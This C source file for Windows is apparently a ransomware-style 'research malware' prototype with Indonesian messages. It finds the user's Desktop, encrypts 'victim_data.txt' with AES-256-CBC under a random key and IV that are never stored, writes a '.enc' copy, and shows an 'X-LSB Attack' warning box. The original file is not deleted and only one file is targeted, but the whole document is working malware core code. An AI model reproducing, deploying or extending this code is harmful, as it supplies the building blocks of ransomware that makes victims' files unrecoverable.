#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h> // Untuk SHGetFolderPath
#include <openssl/evp.h>
#include <openssl/rand.h>

#define KEY_SIZE 32
#define IV_SIZE 16
#define BUFFER_SIZE 4096

void show_message(const char *filepath, const char *encpath) {
    char message[512];
    snprintf(message, sizeof(message),
             "Ini malware riset.\nFile:\n%s\nTelah dienkripsi.\nCek:\n%s",
             filepath, encpath);
    MessageBox(NULL, message, "X-LSB Attack", MB_OK | MB_ICONWARNING);
}

int encrypt_file(const char *input_path, const char *output_path, const unsigned char *key, const unsigned char *iv) {
    FILE *in = fopen(input_path, "rb");
    FILE *out = fopen(output_path, "wb");
    if (!in || !out) {
        perror("File error");
        return 1;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char buffer_in[BUFFER_SIZE];
    unsigned char buffer_out[BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH];
    int len_in, len_out;

    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    while ((len_in = fread(buffer_in, 1, BUFFER_SIZE, in)) > 0) {
        EVP_EncryptUpdate(ctx, buffer_out, &len_out, buffer_in, len_in);
        fwrite(buffer_out, 1, len_out, out);
    }

    EVP_EncryptFinal_ex(ctx, buffer_out, &len_out);
    fwrite(buffer_out, 1, len_out, out);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in);
    fclose(out);
    return 0;
}

int main() {
    char desktop_path[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop_path);

    const char *filename = "victim_data.txt";
    char full_input[MAX_PATH];
    char full_output[MAX_PATH];

    snprintf(full_input, sizeof(full_input), "%s\\%s", desktop_path, filename);
    snprintf(full_output, sizeof(full_output), "%s\\%s.enc", desktop_path, filename);

    unsigned char key[KEY_SIZE];
    unsigned char iv[IV_SIZE];
    RAND_bytes(key, sizeof(key));
    RAND_bytes(iv, sizeof(iv));

    if (encrypt_file(full_input, full_output, key, iv) == 0) {
        show_message(full_input, full_output);
    } else {
        MessageBox(NULL, "Gagal mengenkripsi file.", "X-LSB Error", MB_OK | MB_ICONERROR);
    }

    return 0;
}